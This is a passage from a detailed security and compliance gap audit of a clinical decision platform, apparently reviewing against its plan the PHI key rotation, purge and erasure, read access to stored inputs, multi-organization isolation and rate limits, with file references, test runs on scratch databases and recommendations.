**Plan says.** Key rotation for the PHI key: re-encrypt in batches, each batch chained in the audit trail, verify still passing afterwards (p.10, A5 step 3).

**Current state.** No rotation code, command or test. A ciphertext is base64(nonce + AES-GCM output) with no key id or version, the policy holds exactly one key, and a row sealed under another key raises. I switched MENDARI_PHI_KEY on a scratch database without purging: a reviewer's GET /api/review and GET /api/audit/{old id} answer 400 ('a stored input does not decrypt with this key') while a new decision reads fine, so one stale row fails the whole queue page for readers; viewers are unaffected and the chain still verifies. The documented procedure is 'purge, then switch', and the purge-everything it relies on is refused by the CLI (A5.5).

**Evidence.**

- src/mendari/core/phi.py:91-103 - _seal and _open: one key, no key id in the token; a failed open raises MendariError
- src/mendari/core/audit.py:970-971 - reveal_inputs decrypts every sealed row of the page for a reader
- $ git grep -n -i -E 'rotat|rekey|re-key|reencrypt|re-encrypt|reseal|keyring|previous_key|rewrap' -- 'src/**/*.py' scripts deploy -> comments at core/phi.py:21 and core/session_seal.py:18, and the Hub's publisher keys (cli.py:1300, hub/client.py:247); no rotation code
- $ git grep -n -i -E 'rotat|rekey|reencrypt|keyring' -- tests -> tests/test_hub_client.py:189 only (publisher keys)
- $ python s3_guard_keys.py, part (b) -> old key: reviewer GET /api/review 200; new key: GET /api/review 400, GET /api/audit/<old> 400, GET /api/audit/<new> 200, viewer GET /api/review 200; verify ok True
- docs/deploying-with-phi.md:350-351 - LEAD: 'Re-encrypting in place is not provided'; docs/decisions/ADR-0005-hardening-before-phi.md:46 - LEAD: 'No keyring yet'
- tests/test_phi.py::test_a_ciphertext_only_opens_for_its_own_decision - a wrong key raises (ran: pass)

**Recommendation.** ADR first. A versioned envelope that carries the key id (today's tokens are version 1: try each key of the ring). A key ring: MENDARI_PHI_KEY plus previous keys. `mendari phi rotate --db --batch N` re-seals decision_inputs.ciphertext, decision_inputs.details and notes.sealed with unchanged associated data, chains one event per batch (first id, last id, row count) under a non-decision subject as key events are, and can resume. Tests on SQLite and Postgres: interrupt half-way, a reviewer reads both halves, `audit verify --notes` passes at every step, the old key is removed afterwards. Run it from the CLI against DATABASE_URL, not inside a function. Until then, make a single undecryptable row degrade to `input_restricted` for that row instead of a 400 for the page.

### A5.3b: Missing (verified); severity medium; stage 2; effort S (<1 day)

**Plan says.** Key rotation for the input-hash key: re-key in batches, each batch chained, verify still passing (p.10, A5 step 3).

**Current state.** No rotation code. The keyed hash carries its key id and is a field of the decision record whose SHA-256 is chained at decision.created, so an old hash cannot be re-keyed without breaking verify: I rewrote one stored input_hash on a scratch database and verify failed at that event. In hash mode, and after retention in encrypt mode, the input needed to recompute a hash no longer exists. Switching the variable simply gives new records a new key id, and the chain still verifies.

- src/mendari/core/phi.py:62-70 - input_hash = hmac-sha256:<key id>:<hex>
- src/mendari/core/decision.py:100 - input_hash is part of to_dict(); :315 - computed under the store's policy
- src/mendari/core/audit.py:401 - decision.created chains record_sha256; :1835-1838 - verify recomputes it from the stored record
- $ python s3_guard_keys.py, part (c) -> the same input under two hash keys: key ids differ True, hashes differ True; verify ok True after the switch
- $ python s3_guard_keys.py, part (d) -> after rewriting one stored record's input_hash: verify {'ok': False, 'events': 3, 'broken_at': 2}
- docs/deploying-with-phi.md:354-355 - LEAD: records keep the old key's id and are never re-hashed

**Recommendation.** Do not build re-keying as the plan words it (see plan_defects). Define hash-key rotation as: a new key id for new records, a chained rotation event naming the old and new ids, the active id on /api/health (already there), and the old key destroyed. If the owner needs old hashes replaceable after a leak, that requires moving input_hash out of the chained record for new records: write that question to tasks/todo.md rather than guessing.

### A5.4: Partial (verified); severity medium; stage 2; effort M (1-3 days)

**Plan says.** API key rotation: a new key overlaps the old one for a set period, then the old one is revoked (p.10, A5 step 4).

**Current state.** The parts exist, rotation does not. Keys are stored hashed, limited to the viewer or service role, optionally scoped, expire (90 days by default, 365 at most), can be revoked, are managed by signed-in people only, and creating and revoking are chained. An admin can rotate by hand through the API: create a second key, later DELETE the first. There is no rotate operation, no overlap period, no automatic revocation of the old key and no link between a key and its successor. The dashboard has no key screen at all, so even manual rotation is API-only today (A6 step 3 asks for the screen).

**Recommendation.** POST /api/auth/keys/{key_id}/rotate {overlap_hours} (people only): create the successor with the same name, role, scope and organization, and set the old key's expires_at to min(current, now + overlap). Tests: both keys work inside the overlap, the old one is refused after it, verify passes. The Keys screen belongs to A6 step 3, which asks for rotation again: build the store and route here, the screen there.

### A5.5: Missing (verified); severity high; stage 2; effort S (<1 day)

**Plan says.** Fix `mendari phi purge --days 0` so it purges everything, as documented (p.10, A5 step 5).

**Current state.** Not fixed. I ran it in a scratch directory against a scratch SQLite database with 3 stored decisions and 1 note in encrypt mode: `--days 0` exits 1 with 'give --days or set MENDARI_RETENTION_DAYS' and deletes nothing (3 inputs and 1 note before and after), because 0 is treated as unset and anything below 1 is refused. The smallest window the CLI accepts is 1 day, so an input entered today cannot be purged today. The store method itself purges everything at 0 (3 inputs deleted, 1 note erased, each chained), and `mendari audit verify --notes` passes afterwards. In mode off the purge never touches the plaintext held inside decision records, at any value, and says '0 stored input(s) deleted' without a warning. Negative values and MENDARI_RETENTION_DAYS=0 give the same misleading 'give --days' message.

**Evidence.**

- $ python s1_purge.py encrypt: BEFORE decisions 3, decision_inputs 3, notes_kept 1 -> `mendari phi purge --db s1-encrypt.db --days 0` rc=1 'error: give --days or set MENDARI_RETENTION_DAYS' -> AFTER decision_inputs 3, notes_kept 1
- $ same run: `--days 1` rc=0 '0 stored input(s) deleted and 0 note(s) erased, older than 1 days'; `--days -1` and MENDARI_RETENTION_DAYS=0 -> rc=1 with the same 'give --days' error; `mendari audit verify` -> ok true, events 4

- tests/test_record_hygiene.py:117, tests/test_audit_fhir.py:218 and tests/test_security_log.py:333 call store.purge_inputs(0) directly; tests/test_phi.py:195 and tests/test_notes.py:286 run the CLI with --days 30 and 365; no test runs the CLI with --days 0
- $ git grep -n -i -E 'days[ =]0|--days 0' -- docs README.md deploy notes tasks -> no matches

**Recommendation.** `days = args.days if args.days is not None else settings.retention_days()`. Accept 0 only from the flag, never from the environment variable, and require an explicit confirmation flag (a MENDARI_RETENTION_DAYS=0 typo in a daily job must not wipe everything). Refuse negatives by name. Print how many records hold inputs the purge cannot delete (recorded under mode off). CLI test: 3 decisions and 2 notes -> 0 kept, input.purged and note.erased chained, `audit verify --notes` passes.

### A5.acc-2: Partial (verified); severity blocker; stage 2; effort M (1-3 days)

**Plan says.** No route returns stored plaintext in encrypt mode without a reviewer or admin role and a chained read event (p.10, acceptance).

**Current state.** Holds for data recorded under encrypt; fails for rows recorded earlier under `off`. With sign-in on I asked every mounted GET route and the four FHIR POST searches (41 routes) plus 4 extra URLs (a FHIR-bundle decision with evidence, a reviewed decision with a note) as 7 principals, counting `input.read` events before and after each request. Recorded under encrypt: GET /api/audit/{id}, /api/review and /api/feedback return input, evidence and note text only to a signed-in reviewer or admin and chain one input.read per decision shown; GET /api/packs/{ns}/{name}/feedback/export is admin only (reviewer 403) and chains a read per decision. No other route carries input, note or evidence text for anyone: /api/audit (list), /api/audit/{id}/fhir, /api/audit/export/fhir and /api/audit/verify (admin only), /api/stats, /api/monitoring, /api/evals, /api/deployments, /api/governance, /fhir/Task (read, vread, search), /fhir/AuditEvent and /fhir/Provenance (read, search, POST _search). Viewer and governance people and viewer and service keys never get text; anonymous gets 401; an EHR launch cookie gets 401 on all of them; keys and Backend Services clients can only be viewer or service; in open mode nobody reads a sealed input. No POST route returns stored text (resolve, feedback and outcome answer with what the caller sent), and there is no server-side bulk export. The gap: for rows recorded under off and read under encrypt or hash, the input held inside the record is returned to viewer and governance people and to viewer and service keys by /api/audit, /api/audit/{id}, /api/review and /api/feedback, and evidence by /api/audit and /api/review, with no read chained; reviewers and admins also get it from the list and the queue without a chained read. Notes recorded under off are gated correctly. Not decision data, but stored: /api/smart/session returns the launch's own patient id to the browser holding the launch cookie, by design, with no role and no chained read.

- $ inline script, encrypt with sign-in and a registered EHR: launch cookie GET /api/audit, /api/audit/{id}, /api/review, /api/feedback, feedback/export, /fhir/Task/{id}, /api/audit/export/fhir -> 401 each; input.read chained 0
- src/mendari/server/app.py:297-303 - input_reader: None in open mode or without read_input
- src/mendari/server/auth.py:92-110 - only reviewer and admin hold read_input; :168 feedback export is admin; :171 verify and the FHIR export are admin; :174 every other GET /api/ is read
- src/mendari/core/audit.py:256, 1476 and 1563 - keys and Backend Services clients are viewer or service only
- src/mendari/core/audit.py:991-1003 - the read is chained before the text is put on the item, and only decisions with a decision_inputs row are touched (a record that holds its own input is returned as stored)

**Recommendation.** Close the legacy gap on the read side: in hash and encrypt modes, blank a record's own `input` and evidence for non-readers and chain a read for readers (core/audit.py reveal_inputs and query). ### A5.goal-legacy: Missing (verified); severity blocker; stage 2; effort M (1-3 days)

**Plan says.** Goal: the hosted site stores nothing it can't protect or erase, before anyone but the owner signs in (p.10); today hosted inputs are stored in plaintext and can't be erased (p.3).

**Current state.** Turning encrypt on does nothing for decisions already recorded under `off`. Their input sits inside the record whose digest is chained: retention cannot delete it (the purge only touches decision_inputs and notes), removing it by hand breaks `audit verify`, and it stays readable by viewers (A5.acc-2). The plan's five steps do not mention existing data, and no document warns that a mode switch leaves earlier rows as they were. Whether the hosted database holds such rows is not in the repository; the plan (p.3) and the build log say it does, and that data should be the owner's synthetic test data. If any of it is real patient text, this is the first thing to fix.

**Evidence.**

- src/mendari/core/audit.py:1022-1026 - the purge selects and deletes from decision_inputs only
- $ python s3_guard_keys.py, part (e): a decision recorded under off, store reopened under encrypt -> purge_inputs(0) 0, purge_notes(0) 0; records still holding plaintext input: 1; verify ok; after setting record.input to null by hand: verify {'ok': False, 'events': 2, 'broken_at': 2}
- $ python s2_routes.py legacy -> the viewer key reads the legacy input from /api/audit, /api/audit/{id}, /api/review and /api/feedback with +0 input.read
- src/mendari/core/audit.py:59-63 - LEGACY_TEXT: notes chained by earlier releases also stay in the chain for good, only hidden when read
- $ git grep -n -i -E 'recorded under|already (stored|recorded)|earlier (rows|records)' -- docs README.md deploy -> two unrelated matches (the hash format, the pack spec); nothing about inputs kept from before a mode switch
- notes/overnight-log.md:49 - LEAD: the hosted deployment ran with phi_mode off

**Recommendation.** Add a step 0 to A5. Simplest safe path, since hosted data so far is the owner's synthetic data: retire the hosted database (record the old chain's head hash, keep an ids-only FHIR audit export if wanted, start a new database in encrypt mode). The owner decides whether the old database is destroyed. A build session must not touch production; it can ship the read-side fix (A5.acc-2), a warning in docs/deploying-with-phi.md, and a `mendari phi status` report that counts records holding their own input.

### A5.goal-erase: Missing (verified); severity high; stage 2; effort M (1-3 days)

**Plan says.** Goal: nothing stored that can't be erased (p.10); the acceptance names 'erase' beside purge.

**Current state.** A note can be erased by id (`mendari notes erase`, chained as note.erased, tested). A decision's kept input cannot: the only deletion is by age (purge_inputs), the CLI's smallest window is 1 day, and no command, route or store method erases one decision's input and evidence on request, for example when someone pastes real patient data into the synthetic sandbox.

**Evidence.**

- src/mendari/core/audit.py:835-855 - erase_note; no counterpart for decision_inputs
- src/mendari/cli.py:1362-1389 - `phi purge` (by age) and `notes erase` (by note id) are the only deletion commands; `mendari phi --help` lists purge only
- $ git grep -n -E 'def erase|def purge' -- src/mendari/core/audit.py -> erase_note, purge_notes, purge_inputs
- $ git grep -n -i -E 'erase_input|input\.erased|delete_input|redact' -- 'src/mendari/**/*.py' -> no matches
- src/mendari/server/app.py:840 and src/mendari/server/auth.py:909 - the only DELETE routes besides Backend Services clients are governance approvals and API keys

**Recommendation.** `mendari phi erase --decision <id> --reason request|error --by <identifier>` and an admin route: delete the decision_inputs row, erase the decision's notes, chain `input.erased` with who and why, and map it in standards/audit_fhir.py. Tests on both backends: verify passes and a reader then sees nothing.

### A5.goal-previews: Unknown (unknown); severity high; stage 2; effort owner; owner only

**Plan says.** Goal: the hosted site stores nothing it can't protect or erase (p.10). Preview deployments and their databases are part of the hosted site.

**Current state.** Cannot be settled from the repository. Leads: the README says preview deployments run without sign-in (behind Vercel Authentication), and either share the production database or, with Neon preview branching, get a `preview/<branch>` database branch. The entrypoint does not tell Preview from Production, so a preview needs the PHI variables too. A Vercel cron would run on production only, so retention would never run on a preview branch; the cleanup workflow deletes a branch only when its pull request closes, only for branches of this repository and only when NEON_PROJECT_ID is set. The docs also say deleted rows remain in Neon's point-in-time history for its history window.

**Evidence.**

- README.md:924-930 - LEAD: previews share the production database unless Neon preview branching is enabled; then one database branch per preview
- src/mendari/server/vercel.py:43-61 - one code path for every Vercel environment
- .github/workflows/neon-preview-cleanup.yml:7-16 - runs on pull_request closed, only when vars.NEON_PROJECT_ID is set and the head repository is this one
- docs/deploying-with-phi.md:386-388 - LEAD: 'Erasure is not instant everywhere': backups and Neon's point-in-time history keep deleted rows

**Recommendation.** Owner: confirm in Vercel and Neon whether previews branch or share the production database, set the PHI variables for Preview, and set Neon's history window no longer than the retention period you will promise. What settles it: the Vercel environment variable names per environment, the Neon project's branching and history settings. ### A5.x-stored: Partial (verified); severity medium; stage 2; effort S (<1 day)

**Plan says.** Audit question: what is stored per decision, and which of it the PHI mode covers.

**Current state.** Stored per decision: the decisions row (ids, times, pack, outcome, recommendation, priority, confidence, latency, cost, review status, final label, reviewer, organization) and its record JSON (answers with label, probabilities, provider type, variant and model, and evidence; reasons; rule; error codes; token counts; input hash; governance; input issues; the input). Covered by the mode: the input (off: in the record; hash: not kept; encrypt: sealed in decision_inputs), each answer's evidence (the same), notes (off: plain in `notes`; hash: refused; encrypt: sealed), the input hash (keyed outside off), and exception messages in logs (replaced by the type outside off). Handled in every mode: resource ids in input issues are replaced by type and position, and schema-validation reasons name the rule, never the value. Not covered, kept in the clear and chained for good in every mode: outcome, labels, probabilities, pack-authored reasons, and the identities of reviewers, reporters, requesters and readers (emails). Also in the clear: sign-in session rows (a person's email and name) and API key names. Never stored: provider request and response bodies. The security log takes its fields from an allow-list (ids, counts, route templates), no body or query value. EHR launch rows (token, patient id) are sealed in every mode. In my encrypt-mode scratch databases the planted input and note text appear in no table.

**Evidence.**

- src/mendari/core/decision.py:82-120 - to_dict and to_record; :248 - schema problems never quote the value
- src/mendari/core/audit.py:70-231 - table definitions; :373-417 - record(); :786-811 - _keep_note
- src/mendari/providers/base.py:36-46 and 49-59 - Answer.to_dict; ProviderOutput.extra is not part of the record
- src/mendari/server/security_log.py:64-81 - FIELDS allow-list
- $ python s1_purge.py encrypt -> marker_in_any_table False and notemark_in_any_table False across decisions, audit_events, notes, decision_inputs and feedback; under off both True
- $ sqlite on s2-encrypt.db -> record reasons are pack text ('rule possible-emergency: ...', 'risk level 2 requires human review'); evidence []; input null; chained payloads hold reviewer and reporter emails and note_ref commitments, note null
- $ inline script, encrypt with an EHR launch -> the launch row holds the patient id or token in the clear: False; a person's session row holds the email in the clear: True
- tests/test_record_hygiene.py (ran: pass on SQLite); tests/test_security_log.py (not run)

**Recommendation.** Publish this table in docs/deploying-with-phi.md and the privacy notice as it stands. Decide whether a decision's outcome and labels count as patient data on the hosted site: they are unerasable by design, which is acceptable only while no patient identifier is stored beside them (true today: resource ids are relabelled).

### A5.x-egress: Partial (verified); severity medium; stage 3; effort M (1-3 days)

**Plan says.** Audit question: what leaves the process to third parties (Jev, LLM providers) in each PHI mode.

**Current state.** The PHI mode changes nothing about what leaves. In every mode a Jev variant posts the selected input fields in plaintext to JEV_API_URL, and an LLM variant posts them as the user message to the Vercel AI Gateway (or LLM_BASE_URL). Packs limit the fields with `state_fields` (all five reference packs do); a variant without it sends the whole input. Also leaving: PAS submissions (patient, coverage, order) to the payer URL, CDS Hooks reads from allow-listed FHIR servers, and alert webhooks (no case data). No provider module reads the PHI mode, and nothing ties remote providers to a processor agreement. The plan's Part B (p.12) does list BAAs with Vercel, the database host, the AI Gateway, TypeSafe and each LLM provider if the platform will ever hold patient data, so this is a late-stage gap as long as the hosted site is synthetic-only.

**Evidence.**

- src/mendari/providers/base.py:170-177 - batch_state: the whole input if any variant has no state_fields

**Recommendation.** Name the processors and the fields sent in the privacy notice. Before stage 6: a deployment setting that refuses remote variants unless the deployment declares its processor terms, and a per-pack 'what leaves' line on the Decision Card generated from state_fields.

## A6. Accounts, organizations and self-service keys

### A6.goal: Partial (verified); severity high; stage 3; effort L (1-2 weeks)

**Plan says.** Goal: each partner team works in its own organization without the owner's help (p15)

**Current state.** A partner team can be isolated in its own organization today, but only with the owner's help at every step. The organization exists only as the value of an id_token claim the owner names in MENDARI_OIDC_ORG_CLAIM; each person's role is an entry in MENDARI_OIDC_ROLE_MAP; an EHR is tied to an organization in MENDARI_SMART_EHRS; the quotas are one setting for all. All are read once at startup, so every new person, organization or EHR is an environment edit and a redeploy by the owner. Once a team's admin is in its organization, keys and Backend Services clients are self-service through the API (A6.3a). With Google sign-in the only organization claim available is the Workspace domain ('hd': my knowledge of Google's id_token, not something the repository states), so a partner on a personal Google account lands in 'default' with the owner (A6.2b).

**Evidence.**

- src/mendari/server/auth.py:206-218 - the role map and the organization claim's name are read from the environment
- src/mendari/server/app.py:322-328 - EHR registrations, sign-in settings and organization quotas are read once in create_app
- $ .venv/bin/python -B $SK/p2.py -> HD-CLAIM (MENDARI_OIDC_ORG_CLAIM=hd, e-mail role map) partner with hd: (302, 'clinic.example'); owner without hd: (302, 'default'); EMAILMAP (no organization claim) owner: (302, 'default', ['admin']); partner: (302, 'default', ['reviewer'])
- $ .venv/bin/python -B $SK/p1.py -> KEY list a: [('KEYNAME-A-svc', 'clinic-a'), ('KEYNAME-A-cds', 'clinic-a')]; KEY list b: [('b service', 'clinic-b')]

**Recommendation.** Nothing separate to build: closed by A6.1a, A6.1a-org, A6.1b, A6.1c and A6.2b together. Until they land, partners self-host (plan p14) and no partner e-mail is added to the hosted role map.

### A6.1a: Missing (verified); severity blocker; stage 3; effort L (1-2 weeks)

**Plan says.** Data model: users, and memberships with a role per organization (p15, item 1)

**Current state.** No user or membership record exists. A person exists only as a session row: roles are recomputed on each request from the id_token claims kept in the session, renamed by the MENDARI_OIDC_ROLE_MAP setting; the organization is the value the configured organization claim had at sign-in, else 'default'. One organization per session, the same roles whatever the organization, and no route to list, add or remove people. A partner gets an organization of their own only if the identity provider sends an organization claim and the owner names it in the environment and redeploys; with the e-mail role map and no claim, every mapped person is in 'default'.

**Evidence.**

- src/mendari/core/audit.py:70-231 - _TABLES defines 16 tables; none for users, organizations, memberships or invitations
- $ .venv/bin/python -B $SK/p2.py -> TABLES: [api_keys, audit_events, capability_versions, decision_inputs, decisions, deployments, eval_reports, feedback, governance_approvals, notes, oauth_clients, oauth_tokens, org_usage, provider_usage, rate_limits, smart_sessions, sqlite_sequence]
- src/mendari/server/auth.py:402-408 - roles_from(): roles are the role claim's values mapped through settings.role_map
- src/mendari/server/auth.py:551-558 - a person's Principal: roles from the kept claims, org from the session row
- src/mendari/server/auth.py:292-296 - person_id(): a person is a hash of issuer and subject, used for counting and logging only
- $ .venv/bin/python -B $SK/p1.py -> ROUTES APIRoute (method, path): 73, printed by permission; none for users, members, organizations or invitations
- $ git grep -niE for invit, membership, member(s) -- src tests scripts hub deploy -> no match; git grep -nilE for tenant, account, signup, onboard, roster, team -- src/mendari Python files -> no file
- src/mendari/hub/registry.py:63-80 - the Hub registry has its own hub_namespaces, hub_keys and hub_tokens tables: a separate model, not the engine's organizations (lead for A10)

**Recommendation.** Add users (issuer and subject, verified e-mail) and memberships (organization, set of roles) tables, additive only as _ADDED_COLUMNS requires. Resolve Principal.org and roles from memberships on every request in a new 'memberships' mode; keep today's claim mode for self-hosted sites (deploy/kubernetes/mendari.yaml:26 and deploy/onprem/.env.example:15 depend on it). Add an organization switcher only if a person may hold several memberships; otherwise refuse a second one.

### A6.1a-org: Partial (verified); severity high; stage 3; effort M (1-3 days)

**Plan says.** Data model: organizations (p15, item 1)

**Current state.** An organization is a tenancy key, not a record. It is a string stamped on decisions, evaluation reports, notes, keys, clients, approvals and quota counters and held in a context variable for the request; reads filter by it (A6.2a). There is no organizations table: an organization cannot be created, listed, named, suspended or removed, and has no settings of its own (one quota setting for all). Its id comes unchecked from the id_token claim (a list or a number becomes its text), while an EHR registration's organization must match a pattern, so sign-in can produce an organization no EHR could be registered to. 'default' is the built-in fallback (A6.2b).

**Evidence.**

- src/mendari/core/tenancy.py:17-19 - an organization is a str in a ContextVar; DEFAULT_ORG = 'default'
- src/mendari/core/audit.py:88,110,140,167,191,215,224 - org columns on decisions, eval_reports, governance_approvals, api_keys, oauth_clients, org_usage and notes
- src/mendari/core/audit.py:239 - decisions.org: 'tenancy (v0.6); NULL is the default organization'
- src/mendari/server/auth.py:813-815 - the organization is str() of the claim's value, with no check
- src/mendari/standards/smart.py:55,92 - _ORG pattern (no spaces, commas or '=') is applied to EHR registrations only
- src/mendari/settings.py:129-148 - one MENDARI_ORG_DAILY_LIMITS for every organization
- $ .venv/bin/python -B $SK/p2.py -> ORG claim a list: (302, ['clinic-a', 'clinic-b'] as one text); ORG claim a number: (302, '7')

**Recommendation.** Add an organizations table (id, display name, created at and by, status) seeded with 'default'. Validate ids with one pattern everywhere (the EHR registration's). In memberships mode take a request's organization from a membership, never from free claim text. Move per-organization settings (quotas, EHR registrations) to rows as they become self-service.

### A6.1b: Missing (verified); severity high; stage 3; effort M (1-3 days)

**Plan says.** Invitations by email with expiry (p15, item 1)

**Current state.** Nothing exists: no invitation table, route, page or CLI command, and no code that sends e-mail.

**Evidence.**

- $ git grep -niE for invit, membership, member(s) -- src tests scripts hub deploy -> no match
- $ git grep -nilE for smtplib, sendgrid, mailgun, postmark, send_mail, sendmail -- src scripts deploy -> only src/mendari/standards/fhir_r4_structure.json (HL7's schema data, not code)

**Recommendation.** Build invitations as single-use, expiring rows (hashed token, organization, roles, invited e-mail, inviter, expiry) stored like session rows. Acceptance requires a sign-in whose verified e-mail equals the invited one, then binds the membership to issuer and subject. Chain invitation.created, .accepted and .revoked. Show the link to the inviting admin to send themselves unless the owner chooses a mail provider.

### A6.2a: Partial (verified); severity high; stage 3; effort M (1-3 days)

**Plan says.** Every read, write, export and audit route is filtered by the caller's organization (p15, item 2)

**Current state.** Decision data is isolated. Of 73 mounted routes (sign-in, Backend Services and the SMART launch on), 41 read or write organization-owned rows and all 41 go through AuditStore methods that add the organization condition or stamp the organization. I called every GET route as a second organization's admin, service key and viewer with the first one's ids (51 calls each, plus the three POST searches): nothing of the first organization came back, and the second one's writes on the first one's rows were refused. Not filtered: (1) GET /api/audit/verify walks the whole deployment's chain, answers any organization's admin with the global event count and head, loads every organization's records and has no rate-limit class; (2) GET /api/health gives any reader the deployment-wide FHIR allow-list, which names other organizations' EHR hosts (the registered-EHR list beside it is already filtered by organization), plus deployment-wide provider call counts and credential source names; (3) GET /api/deployments is deployment-wide by design. Also: every event an organization reads carries the prev_hash of the previous event in the global chain, usually another organization's; evaluations spend the deployment's provider budget, not the organization's quota; a CDS Hooks prefetch reads from a caller-named FHIR server checked only against the deployment-wide allow-list (read in code, not exercised); and the filter is fail-open: with no organization in the request context it is '1 = 1', which public and page routes run under today (none of them reads organization rows).

### A6.2b: Contradicts the plan (verified); severity blocker; stage 3; effort M (1-3 days)

**Plan says.** The default organization keeps only the owner's existing data (p15, item 2)

**Current state.** 'default' is the catch-all, not the owner's private organization. A sign-in whose id_token has no organization claim (missing or empty) is placed in 'default' even when a claim is configured; an identity provider may also send the literal value 'default'; a list or number claim becomes an organization named by its text. Rows with no organization read as 'default', and every write without an organization in context is stamped 'default'. With no organization claim configured (the e-mail role map documented for Google), every mapped person is in 'default': in my run a partner mapped as reviewer read the owner's decision. No test covers a sign-in that omits a configured claim.

**Recommendation.** In memberships mode a sign-in with no membership gets no organization and the no-access page (A6.4). ### A6.5: Partial (verified); severity medium; stage 3; effort M (1-3 days)

**Plan says.** Per-user daily caps alongside the existing per-organization quotas, with a 429 and Retry-After when exceeded (p15, item 5)

**Current state.** No dedicated per-user daily cap exists, but most of the mechanism does. Rate limits are per principal (person, key, client, EHR launch), answer 429 with Retry-After, and record nothing for a refused request. The rate syntax accepts any number of hours, so a 24-hour per-principal limit can be set today (decide=3/24h refused the fourth decision with Retry-After 28800). What is missing against the plan: there is one rate per class, so a daily rate replaces the per-minute protection instead of sitting alongside it; it is a rolling bucket, not a calendar day (Retry-After is to the next slot, not to midnight); it applies only to the decide, guard, evaluate and export classes; it is one deployment-wide setting, nothing per organization or person; it is per key, so an organization multiplies its allowance by making keys (no cap on keys); and no test covers a 24-hour window. Separately, per-organization daily quotas exist (one setting for every organization), but over quota a decision is not refused: it is answered 200, recorded and chained as ABSTAIN or HUMAN_REVIEW with no Retry-After. A 429 with Retry-After to local midnight is already defined for a quota or budget error that reaches a route, but decisions catch the error and fall back. Evaluations bypass organization quotas.

**Evidence.**

- src/mendari/server/limits.py:94-102 - DEFAULT_RATES: signin, token, token_failures, decide, guard, evaluate, export; one Rate per class
- src/mendari/server/limits.py:61,142-155 - the rate pattern count/[n](s|min|h)[:burst] accepts any multiple of hours
- src/mendari/server/limits.py:265 - the bucket key is the principal id (the address before sign-in)
- $ .venv/bin/python -B $SK/p2.py -> parse_rate 3/24h: 3/24h; RATE key1 decide x4 at 3/24h: [(200, None), (200, None), (200, None), (429, '28800')]; RATE key2 (same organization) after key1 is over: 200; rows recorded for the organization: 4; buckets: [decide|key, decide|key]
- src/mendari/core/decision.py:157-174 - admit_decision, for_evaluation and _charge_org count per organization only
- src/mendari/core/decision.py:274-279,293-294 - over quota every provider fails with quota_exhausted; the decision is still made and recorded
- $ .venv/bin/python -B $SK/p2.py -> QUOTA org a, limit 1, three decisions (status, outcome, Retry-After): [(200, 'HUMAN_REVIEW', None), (200, 'ABSTAIN', None), (200, 'ABSTAIN', None)]; rows recorded for a: 3; org_usage: [(clinic-a, decisions, 1), (clinic-b, decisions, 1)]; no per-user usage table
- src/mendari/server/app.py:139-140,1629-1638 - budget_exhausted and quota_exhausted map to 429 with Retry-After = seconds until local midnight when the error reaches a route
- src/mendari/settings.py:129-148 - MENDARI_ORG_DAILY_LIMITS: one set of limits for all organizations
- tests/test_limits.py::test_over_its_quota_a_decision_falls_back_to_human_review_with_one_alert - passes
- tests/test_limits.py::test_each_refusal_says_when_to_retry_in_the_routes_own_shape and ::test_a_daily_budget_or_quota_says_retry_after_midnight - pass

**Recommendation.** Add a daily counter per principal id (user:, key:, client:, ehr:) beside org_usage, checked in the guard before any body is read: 429 with Retry-After to local midnight (retry_headers already computes it), nothing recorded. Keep the per-minute rates as they are. Decide and document how the cap meets the existing fallback for organization quotas (see plan defects). Add a per-organization rate bucket and a cap on active keys, and count evaluation provider calls per organization.
